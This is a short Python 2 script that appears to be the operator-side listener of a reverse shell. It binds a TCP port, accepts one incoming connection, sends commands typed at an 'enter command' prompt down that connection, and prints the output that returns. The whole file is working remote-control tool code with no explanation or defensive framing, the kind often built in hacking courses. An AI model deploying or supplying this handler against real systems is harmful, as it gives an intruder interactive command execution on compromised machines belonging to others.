import socket

class SocketListener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("listening on")
        (self.connection, address) = listener.accept()
        print("Connected from " + str(address))

    def listening(self):
        while True:
            command_input = raw_input("enter command: ")
            self.connection.send(command_input)
            command_output = self.connection.recv(1024)
            print(command_output)
